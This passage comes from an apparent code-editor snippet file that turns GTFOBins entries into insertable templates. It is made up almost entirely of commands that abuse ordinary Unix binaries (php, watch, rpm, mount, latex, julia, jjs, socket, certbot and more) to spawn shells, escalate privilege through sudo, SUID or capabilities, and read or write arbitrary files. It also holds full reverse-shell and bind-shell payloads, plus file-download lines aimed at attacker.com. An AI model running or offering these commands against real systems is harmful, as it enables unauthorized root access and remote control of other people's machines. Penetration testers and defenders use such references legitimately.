        "description": "abuse php with file-download - Fetch a remote file via HTTP GET request."
    },
    "php suid (gtfobins)": {
        "prefix": "php suid",
        "body": [
            "abuse php with suid",
            "",
            "```sh",
            "CMD=\"/bin/sh\"",
            "./php -r \"pcntl_exec('/bin/sh', ['-p']);\"${0}",
            "```"
        ],
        "description": "abuse php with suid"
    },
    "php sudo (gtfobins)": {
        "prefix": "php sudo",
        "body": [
            "abuse php with sudo",
            "",
            "```sh",
            "CMD=\"/bin/sh\"",
            "sudo php -r \"system('\\$CMD');\"${0}",
            "```"
        ],
        "description": "abuse php with sudo"
    },
    "php capabilities (gtfobins)": {
        "prefix": "php capabilities",
        "body": [
            "abuse php with capabilities",
            "",
            "```sh",
            "CMD=\"/bin/sh\"",
            "./php -r \"posix_setuid(0); system('\\$CMD');\"${0}",
            "```"
        ],
        "description": "abuse php with capabilities"
    },
    "php file-read (gtfobins)": {
        "prefix": "php file-read",
        "body": [
            "abuse php with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "php -r 'readfile(getenv(\"LFILE\"));'${0}",
            "```"
        ],
        "description": "abuse php with file-read"
    },
    "php file-write (gtfobins)": {
        "prefix": "php file-write",
        "body": [
            "abuse php with file-write, write data to a file, filename should be absolute.",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "php -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'${0}",
            "```"
        ],
        "description": "abuse php with file-write - write data to a file, filename should be absolute."
    },
    "ksu sudo (gtfobins)": {
        "prefix": "ksu sudo",
        "body": [
            "abuse ksu with sudo",
            "",
            "```sh",
            "sudo ksu -q -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse ksu with sudo"
    },
    "watch shell (gtfobins)": {
        "prefix": "watch shell",
        "body": [
            "abuse watch with shell",
            "",
            "```sh",
            "watch -x sh -c 'reset; exec sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with shell"
    },
    "watch suid (gtfobins)": {
        "prefix": "watch suid",
        "body": [
            "abuse watch with suid, This keeps the SUID privileges only if the `-x` option is present.",
            "",
            "```sh",
            "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with suid - This keeps the SUID privileges only if the `-x` option is present."
    },
    "watch sudo (gtfobins)": {
        "prefix": "watch sudo",
        "body": [
            "abuse watch with sudo",
            "",
            "```sh",
            "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with sudo"
    },
    "watch limited-suid (gtfobins)": {
        "prefix": "watch limited-suid",
        "body": [
            "abuse watch with limited-suid",
            "",
            "```sh",
            "./watch 'reset; exec sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse watch with limited-suid"
    },
    "rpm shell (gtfobins)": {
        "prefix": "rpm shell",
        "body": [
            "abuse rpm with shell",
            "",
            "```sh",
            "rpm --pipe '/bin/sh 0<&1'${0}",
            "```"
        ],
        "description": "abuse rpm with shell"
    },
    "rpm limited-suid (gtfobins)": {
        "prefix": "rpm limited-suid",
        "body": [
            "abuse rpm with limited-suid",
            "",
            "```sh",
            "./rpm --eval '%{lua:os.execute(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpm with limited-suid"
    },
    "rpm sudo (gtfobins)": {
        "prefix": "rpm sudo",
        "body": [
            "abuse rpm with sudo, \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo rpm -ivh x-1.0-1.noarch.rpm${0}",
            "```"
        ],
        "description": "abuse rpm with sudo - \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "install suid (gtfobins)": {
        "prefix": "install suid",
        "body": [
            "abuse install with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "TF=\\$(mktemp)",
            "./install -m 6777 \\$LFILE \\$TF${0}",
            "```"
        ],
        "description": "abuse install with suid"
    },
    "install sudo (gtfobins)": {
        "prefix": "install sudo",
        "body": [
            "abuse install with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "TF=\\$(mktemp)",
            "sudo install -m 6777 \\$LFILE \\$TF${0}",
            "```"
        ],
        "description": "abuse install with sudo"
    },
    "zathura shell (gtfobins)": {
        "prefix": "zathura shell",
        "body": [
            "abuse zathura with shell",
            "",
            "```sh",
            "zathura",
            ":! /bin/sh -c 'exec /bin/sh 0<&1'${0}",
            "```"
        ],
        "description": "abuse zathura with shell"
    },
    "zathura sudo (gtfobins)": {
        "prefix": "zathura sudo",
        "body": [
            "abuse zathura with sudo",
            "",
            "```sh",
            "sudo zathura",
            ":! /bin/sh -c 'exec /bin/sh 0<&1'${0}",
            "```"
        ],
        "description": "abuse zathura with sudo"
    },
    "rlwrap shell (gtfobins)": {
        "prefix": "rlwrap shell",
        "body": [
            "abuse rlwrap with shell",
            "",
            "```sh",
            "rlwrap /bin/sh${0}",
            "```"
        ],
        "description": "abuse rlwrap with shell"
    },
    "rlwrap file-write (gtfobins)": {
        "prefix": "rlwrap file-write",
        "body": [
            "abuse rlwrap with file-write, This adds timestamps to the output file. This relies on the external `echo` command.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "rlwrap -l \"\\$LFILE\" echo DATA${0}",
            "```"
        ],
        "description": "abuse rlwrap with file-write - This adds timestamps to the output file. This relies on the external `echo` command."
    },
    "rlwrap suid (gtfobins)": {
        "prefix": "rlwrap suid",
        "body": [
            "abuse rlwrap with suid",
            "",
            "```sh",
            "./rlwrap -H /dev/null /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse rlwrap with suid"
    },
    "rlwrap sudo (gtfobins)": {
        "prefix": "rlwrap sudo",
        "body": [
            "abuse rlwrap with sudo",
            "",
            "```sh",
            "sudo rlwrap /bin/sh${0}",
            "```"
        ],
        "description": "abuse rlwrap with sudo"
    },
    "basenc file-read (gtfobins)": {
        "prefix": "basenc file-read",
        "body": [
            "abuse basenc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "basenc --base64 \\$LFILE | basenc -d --base64${0}",
            "```"
        ],
        "description": "abuse basenc with file-read"
    },
    "basenc suid (gtfobins)": {
        "prefix": "basenc suid",
        "body": [
            "abuse basenc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "basenc --base64 \\$LFILE | basenc -d --base64${0}",
            "```"
        ],
        "description": "abuse basenc with suid"
    },
    "basenc sudo (gtfobins)": {
        "prefix": "basenc sudo",
        "body": [
            "abuse basenc with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo basenc --base64 \\$LFILE | basenc -d --base64${0}",
            "```"
        ],
        "description": "abuse basenc with sudo"
    },
    "mount sudo (gtfobins)": {
        "prefix": "mount sudo",
        "body": [
            "abuse mount with sudo, Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell.",
            "",
            "```sh",
            "sudo mount -o bind /bin/sh /bin/mount",
            "sudo mount${0}",
            "```"
        ],
        "description": "abuse mount with sudo - Exploit the fact that `mount` can be executed via `sudo` to *replace* the `mount` binary with a shell."
    },
    "highlight file-read (gtfobins)": {
        "prefix": "highlight file-read",
        "body": [
            "abuse highlight with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "highlight --no-doc --failsafe \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse highlight with file-read"
    },
    "highlight suid (gtfobins)": {
        "prefix": "highlight suid",
        "body": [
            "abuse highlight with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./highlight --no-doc --failsafe \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse highlight with suid"
    },
    "highlight sudo (gtfobins)": {
        "prefix": "highlight sudo",
        "body": [
            "abuse highlight with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo highlight --no-doc --failsafe \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse highlight with sudo"
    },
    "timedatectl shell (gtfobins)": {
        "prefix": "timedatectl shell",
        "body": [
            "abuse timedatectl with shell",
            "",
            "```sh",
            "timedatectl list-timezones",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse timedatectl with shell"
    },
    "timedatectl sudo (gtfobins)": {
        "prefix": "timedatectl sudo",
        "body": [
            "abuse timedatectl with sudo",
            "",
            "```sh",
            "sudo timedatectl list-timezones",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse timedatectl with sudo"
    },
    "dmsetup sudo (gtfobins)": {
        "prefix": "dmsetup sudo",
        "body": [
            "abuse dmsetup with sudo",
            "",
            "```sh",
            "sudo dmsetup create base <<EOF",
            "0 3534848 linear /dev/loop0 94208",
            "EOF",
            "sudo dmsetup ls --exec '/bin/sh -s'${0}",
            "```"
        ],
        "description": "abuse dmsetup with sudo"
    },
    "dmsetup suid (gtfobins)": {
        "prefix": "dmsetup suid",
        "body": [
            "abuse dmsetup with suid",
            "",
            "```sh",
            "./dmsetup create base <<EOF",
            "0 3534848 linear /dev/loop0 94208",
            "EOF",
            "./dmsetup ls --exec '/bin/sh -p -s'${0}",
            "```"
        ],
        "description": "abuse dmsetup with suid"
    },
    "ansible-playbook shell (gtfobins)": {
        "prefix": "ansible-playbook shell",
        "body": [
            "abuse ansible-playbook with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >\\$TF",
            "ansible-playbook \\$TF${0}",
            "```"
        ],
        "description": "abuse ansible-playbook with shell"
    },
    "ansible-playbook sudo (gtfobins)": {
        "prefix": "ansible-playbook sudo",
        "body": [
            "abuse ansible-playbook with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >\\$TF",
            "sudo ansible-playbook \\$TF${0}",
            "```"
        ],
        "description": "abuse ansible-playbook with sudo"
    },
    "xz file-read (gtfobins)": {
        "prefix": "xz file-read",
        "body": [
            "abuse xz with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xz -c \"\\$LFILE\" | xz -d${0}",
            "```"
        ],
        "description": "abuse xz with file-read"
    },
    "xz suid (gtfobins)": {
        "prefix": "xz suid",
        "body": [
            "abuse xz with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xz -c \"\\$LFILE\" | xz -d${0}",
            "```"
        ],
        "description": "abuse xz with suid"
    },
    "xz sudo (gtfobins)": {
        "prefix": "xz sudo",
        "body": [
            "abuse xz with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xz -c \"\\$LFILE\" | xz -d${0}",
            "```"
        ],
        "description": "abuse xz with sudo"
    },
    "enscript shell (gtfobins)": {
        "prefix": "enscript shell",
        "body": [
            "abuse enscript with shell",
            "",
            "```sh",
            "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'${0}",
            "```"
        ],
        "description": "abuse enscript with shell"
    },
    "enscript sudo (gtfobins)": {
        "prefix": "enscript sudo",
        "body": [
            "abuse enscript with sudo",
            "",
            "```sh",
            "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'${0}",
            "```"
        ],
        "description": "abuse enscript with sudo"
    },
    "ex shell (gtfobins)": {
        "prefix": "ex shell",
        "body": [
            "abuse ex with shell",
            "",
            "```sh",
            "ex",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ex with shell"
    },
    "ex file-write (gtfobins)": {
        "prefix": "ex file-write",
        "body": [
            "abuse ex with file-write",
            "",
            "```sh",
            "ex ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse ex with file-write"
    },
    "ex file-read (gtfobins)": {
        "prefix": "ex file-read",
        "body": [
            "abuse ex with file-read",
            "",
            "```sh",
            "ex ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse ex with file-read"
    },
    "ex sudo (gtfobins)": {
        "prefix": "ex sudo",
        "body": [
            "abuse ex with sudo",
            "",
            "```sh",
            "sudo ex",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ex with sudo"
    },
    "jtag shell (gtfobins)": {
        "prefix": "jtag shell",
        "body": [
            "abuse jtag with shell",
            "",
            "```sh",
            "jtag --interactive",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse jtag with shell"
    },
    "jtag sudo (gtfobins)": {
        "prefix": "jtag sudo",
        "body": [
            "abuse jtag with sudo",
            "",
            "```sh",
            "sudo jtag --interactive",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse jtag with sudo"
    },
    "stdbuf shell (gtfobins)": {
        "prefix": "stdbuf shell",
        "body": [
            "abuse stdbuf with shell",
            "",
            "```sh",
            "stdbuf -i0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse stdbuf with shell"
    },
    "stdbuf suid (gtfobins)": {
        "prefix": "stdbuf suid",
        "body": [
            "abuse stdbuf with suid",
            "",
            "```sh",
            "./stdbuf -i0 /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse stdbuf with suid"
    },
    "stdbuf sudo (gtfobins)": {
        "prefix": "stdbuf sudo",
        "body": [
            "abuse stdbuf with sudo",
            "",
            "```sh",
            "sudo stdbuf -i0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse stdbuf with sudo"
    },
    "latex shell (gtfobins)": {
        "prefix": "latex shell",
        "body": [
            "abuse latex with shell",
            "",
            "```sh",
            "latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse latex with shell"
    },
    "latex file-read (gtfobins)": {
        "prefix": "latex file-read",
        "body": [
            "abuse latex with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}'",
            "strings article.dvi${0}",
            "```"
        ],
        "description": "abuse latex with file-read - The read file will be part of the output."
    },
    "latex sudo (gtfobins)": {
        "prefix": "latex sudo",
        "body": [
            "abuse latex with sudo",
            "",
            "```sh",
            "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse latex with sudo"
    },
    "latex limited-suid (gtfobins)": {
        "prefix": "latex limited-suid",
        "body": [
            "abuse latex with limited-suid",
            "",
            "```sh",
            "./latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse latex with limited-suid"
    },
    "julia shell (gtfobins)": {
        "prefix": "julia shell",
        "body": [
            "abuse julia with shell",
            "",
            "```sh",
            "julia -e 'run(`/bin/sh`)'${0}",
            "```"
        ],
        "description": "abuse julia with shell"
    },
    "julia file-read (gtfobins)": {
        "prefix": "julia file-read",
        "body": [
            "abuse julia with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "julia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'${0}",
            "```"
        ],
        "description": "abuse julia with file-read"
    },
    "julia file-write (gtfobins)": {
        "prefix": "julia file-write",
        "body": [
            "abuse julia with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "julia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'${0}",
            "```"
        ],
        "description": "abuse julia with file-write"
    },
    "julia file-download (gtfobins)": {
        "prefix": "julia file-download",
        "body": [
            "abuse julia with file-download",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "julia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse julia with file-download"
    },
    "julia reverse-shell (gtfobins)": {
        "prefix": "julia reverse-shell",
        "body": [
            "abuse julia with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "julia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`\\$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'${0}",
            "```"
        ],
        "description": "abuse julia with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "julia suid (gtfobins)": {
        "prefix": "julia suid",
        "body": [
            "abuse julia with suid",
            "",
            "```sh",
            "./julia -e 'run(`/bin/sh -p`)'${0}",
            "```"
        ],
        "description": "abuse julia with suid"
    },
    "julia sudo (gtfobins)": {
        "prefix": "julia sudo",
        "body": [
            "abuse julia with sudo",
            "",
            "```sh",
            "sudo julia -e 'run(`/bin/sh`)'${0}",
            "```"
        ],
        "description": "abuse julia with sudo"
    },
    "hexdump file-read (gtfobins)": {
        "prefix": "hexdump file-read",
        "body": [
            "abuse hexdump with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "hexdump -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hexdump with file-read"
    },
    "hexdump suid (gtfobins)": {
        "prefix": "hexdump suid",
        "body": [
            "abuse hexdump with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./hexdump -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hexdump with suid"
    },
    "hexdump sudo (gtfobins)": {
        "prefix": "hexdump sudo",
        "body": [
            "abuse hexdump with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo hexdump -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hexdump with sudo"
    },
    "ed shell (gtfobins)": {
        "prefix": "ed shell",
        "body": [
            "abuse ed with shell",
            "",
            "```sh",
            "ed",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ed with shell"
    },
    "ed file-write (gtfobins)": {
        "prefix": "ed file-write",
        "body": [
            "abuse ed with file-write",
            "",
            "```sh",
            "ed ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse ed with file-write"
    },
    "ed file-read (gtfobins)": {
        "prefix": "ed file-read",
        "body": [
            "abuse ed with file-read",
            "",
            "```sh",
            "ed ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse ed with file-read"
    },
    "ed suid (gtfobins)": {
        "prefix": "ed suid",
        "body": [
            "abuse ed with suid",
            "",
            "```sh",
            "./ed ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse ed with suid"
    },
    "ed sudo (gtfobins)": {
        "prefix": "ed sudo",
        "body": [
            "abuse ed with sudo",
            "",
            "```sh",
            "sudo ed",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ed with sudo"
    },
    "ed limited-suid (gtfobins)": {
        "prefix": "ed limited-suid",
        "body": [
            "abuse ed with limited-suid",
            "",
            "```sh",
            "./ed",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ed with limited-suid"
    },
    "paste file-read (gtfobins)": {
        "prefix": "paste file-read",
        "body": [
            "abuse paste with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "paste \\$LFILE${0}",
            "```"
        ],
        "description": "abuse paste with file-read"
    },
    "paste suid (gtfobins)": {
        "prefix": "paste suid",
        "body": [
            "abuse paste with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "paste \\$LFILE${0}",
            "```"
        ],
        "description": "abuse paste with suid"
    },
    "paste sudo (gtfobins)": {
        "prefix": "paste sudo",
        "body": [
            "abuse paste with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo paste \\$LFILE${0}",
            "```"
        ],
        "description": "abuse paste with sudo"
    },
    "msgconv file-read (gtfobins)": {
        "prefix": "msgconv file-read",
        "body": [
            "abuse msgconv with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgconv -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgconv with file-read"
    },
    "msgconv sudo (gtfobins)": {
        "prefix": "msgconv sudo",
        "body": [
            "abuse msgconv with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgconv -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgconv with sudo"
    },
    "msgconv suid (gtfobins)": {
        "prefix": "msgconv suid",
        "body": [
            "abuse msgconv with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgconv -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgconv with suid"
    },
    "multitime shell (gtfobins)": {
        "prefix": "multitime shell",
        "body": [
            "abuse multitime with shell",
            "",
            "```sh",
            "multitime /bin/sh${0}",
            "```"
        ],
        "description": "abuse multitime with shell"
    },
    "multitime suid (gtfobins)": {
        "prefix": "multitime suid",
        "body": [
            "abuse multitime with suid",
            "",
            "```sh",
            "./multitime /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse multitime with suid"
    },
    "multitime sudo (gtfobins)": {
        "prefix": "multitime sudo",
        "body": [
            "abuse multitime with sudo",
            "",
            "```sh",
            "sudo multitime /bin/sh${0}",
            "```"
        ],
        "description": "abuse multitime with sudo"
    },
    "socket reverse-shell (gtfobins)": {
        "prefix": "socket reverse-shell",
        "body": [
            "abuse socket with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "socket -qvp '/bin/sh -i' \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse socket with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "socket bind-shell (gtfobins)": {
        "prefix": "socket bind-shell",
        "body": [
            "abuse socket with bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "socket -svp '/bin/sh -i' \\$LPORT${0}",
            "```"
        ],
        "description": "abuse socket with bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "script shell (gtfobins)": {
        "prefix": "script shell",
        "body": [
            "abuse script with shell",
            "",
            "```sh",
            "script -q /dev/null${0}",
            "```"
        ],
        "description": "abuse script with shell"
    },
    "script sudo (gtfobins)": {
        "prefix": "script sudo",
        "body": [
            "abuse script with sudo",
            "",
            "```sh",
            "sudo script -q /dev/null${0}",
            "```"
        ],
        "description": "abuse script with sudo"
    },
    "script file-write (gtfobins)": {
        "prefix": "script file-write",
        "body": [
            "abuse script with file-write, The wrote content is corrupted by debug prints.",
            "",
            "```sh",
            "script -q -c 'echo DATA' ${1:file_to_write}${0}",
            "```"
        ],
        "description": "abuse script with file-write - The wrote content is corrupted by debug prints."
    },
    "agetty suid (gtfobins)": {
        "prefix": "agetty suid",
        "body": [
            "abuse agetty with suid",
            "",
            "```sh",
            "./agetty -o -p -l /bin/sh -a root tty${0}",
            "```"
        ],
        "description": "abuse agetty with suid"
    },
    "check_log file-read (gtfobins)": {
        "prefix": "check_log file-read",
        "body": [
            "abuse check_log with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "OUTPUT=output_file",
            "check_log -F \\$LFILE -O \\$OUTPUT",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse check_log with file-read"
    },
    "check_log file-write (gtfobins)": {
        "prefix": "check_log file-write",
        "body": [
            "abuse check_log with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "check_log -F \\$INPUT -O \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_log with file-write"
    },
    "check_log sudo (gtfobins)": {
        "prefix": "check_log sudo",
        "body": [
            "abuse check_log with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "sudo check_log -F \\$INPUT -O \\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_log with sudo"
    },
    "base32 file-read (gtfobins)": {
        "prefix": "base32 file-read",
        "body": [
            "abuse base32 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base32 \"\\$LFILE\" | base32 --decode${0}",
            "```"
        ],
        "description": "abuse base32 with file-read"
    },
    "base32 suid (gtfobins)": {
        "prefix": "base32 suid",
        "body": [
            "abuse base32 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base32 \"\\$LFILE\" | base32 --decode${0}",
            "```"
        ],
        "description": "abuse base32 with suid"
    },
    "base32 sudo (gtfobins)": {
        "prefix": "base32 sudo",
        "body": [
            "abuse base32 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo base32 \"\\$LFILE\" | base32 --decode${0}",
            "```"
        ],
        "description": "abuse base32 with sudo"
    },
    "gem shell (gtfobins)": {
        "prefix": "gem shell",
        "body": [
            "abuse gem with shell, This executes the specified file as [`ruby`](/gtfobins/ruby/) code.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'system(\"/bin/sh\")' > \\$TF/x",
            "gem install --file \\$TF/x${0}",
            "```"
        ],
        "description": "abuse gem with shell - This executes the specified file as [`ruby`](/gtfobins/ruby/) code."
    },
    "gem sudo (gtfobins)": {
        "prefix": "gem sudo",
        "body": [
            "abuse gem with sudo, This requires the name of an installed gem to be provided (`rdoc` is usually installed).",
            "",
            "```sh",
            "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc${0}",
            "```"
        ],
        "description": "abuse gem with sudo - This requires the name of an installed gem to be provided (`rdoc` is usually installed)."
    },
    "certbot shell (gtfobins)": {
        "prefix": "certbot shell",
        "body": [
            "abuse certbot with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir \\$TF --work-dir \\$TF --config-dir \\$TF --pre-hook '/bin/sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse certbot with shell"
    },
    "certbot sudo (gtfobins)": {
        "prefix": "certbot sudo",
        "body": [
            "abuse certbot with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir \\$TF --work-dir \\$TF --config-dir \\$TF --pre-hook '/bin/sh 1>&0 2>&0'${0}",
            "```"
        ],
        "description": "abuse certbot with sudo"
    },
    "jjs shell (gtfobins)": {
        "prefix": "jjs shell",
        "body": [
            "abuse jjs with shell",
            "",
            "```sh",
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)').waitFor()\" | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with shell"
    },
    "jjs reverse-shell (gtfobins)": {
        "prefix": "jjs reverse-shell",
        "body": [
            "abuse jjs with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "echo 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");",
            "var port=Java.type(\"java.lang.System\").getenv(\"RPORT\");",
            "var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");",
            "var p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();",
            "var Socket = Java.type(\"java.net.Socket\");",
            "var s=new Socket(host,port);",
            "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
            "var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "jjs file-download (gtfobins)": {
        "prefix": "jjs file-download",
        "body": [
            "abuse jjs with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "echo \"var URL = Java.type('java.net.URL');",
            "var ws = new URL('\\$URL');",
            "var Channels = Java.type('java.nio.channels.Channels');",
            "var rbc = Channels.newChannel(ws.openStream());",
            "var FileOutputStream = Java.type('java.io.FileOutputStream');",
            "var fos = new FileOutputStream('\\$LFILE');",
            "fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);",
            "fos.close();",
            "rbc.close();\" | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with file-download - Fetch a remote file via HTTP GET request."
    },
    "jjs file-write (gtfobins)": {
        "prefix": "jjs file-write",
        "body": [
            "abuse jjs with file-write",
            "",
            "```sh",
            "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");",
            "var fw=new FileWriter(\"./${1:file_to_write}\");",
            "fw.write(\"DATA\");",
            "fw.close();' | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with file-write"
    },
    "jjs file-read (gtfobins)": {
        "prefix": "jjs file-read",
        "body": [
            "abuse jjs with file-read",
